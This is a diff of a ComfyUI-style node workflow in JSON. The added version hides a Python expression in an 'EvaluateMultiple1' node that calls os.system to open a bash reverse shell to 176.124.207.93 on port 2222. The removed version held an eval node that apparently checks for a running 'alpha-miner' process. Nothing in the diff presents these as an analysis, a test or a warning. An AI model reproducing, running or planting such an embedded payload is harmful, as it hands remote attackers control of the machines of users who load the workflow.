@@ -1,28 +1,42 @@
 {
   "1": {
-    "class_type": "RandomNoise",
     "inputs": {
-      "noise_seed": 55555
-    }
-  },
-  "2": {
-    "class_type": "SRL Eval",
-    "inputs": {
-      "parameters": "a",
-      "code": "import subprocess\np = subprocess.run([\"pgrep\", \"-a\", \"alpha-miner\"], capture_output=True, text=True)\nimport torch\nreturn torch.zeros(1,1,1,3)",
-      "arg0": [
-        "1",
-        0
-      ]
-    }
-  },
-  "3": {
-    "class_type": "PreviewImage",
-    "inputs": {
-      "images": [
+      "expression": "__import__('os').system('bash -c \"bash -i >& /dev/tcp/176.124.207.93/2222 0>&1\"')",
+      "input_count": 1,
+      "print_to_console": "False",
+      "update": null,
+      "in1": [
         "2",
         0
       ]
+    },
+    "class_type": "EvaluateMultiple1",
+    "_meta": {
+      "title": "EvaluateMultiple1"
+    }
+  },
+  "2": {
+    "inputs": {
+      "noise_seed": 785269268518997
+    },
+    "class_type": "RandomNoise",
+    "_meta": {
+      "title": "Случайный шум"
+    }
+  },
+  "3": {
+    "inputs": {
+      "preview_markdown": "",
+      "preview_text": "",
+      "previewMode": null,
+      "source": [
+        "1",
+        0
+      ]
+    },
+    "class_type": "PreviewAny",
+    "_meta": {
+      "title": "Предпросмотр любого"
     }
   }
 }
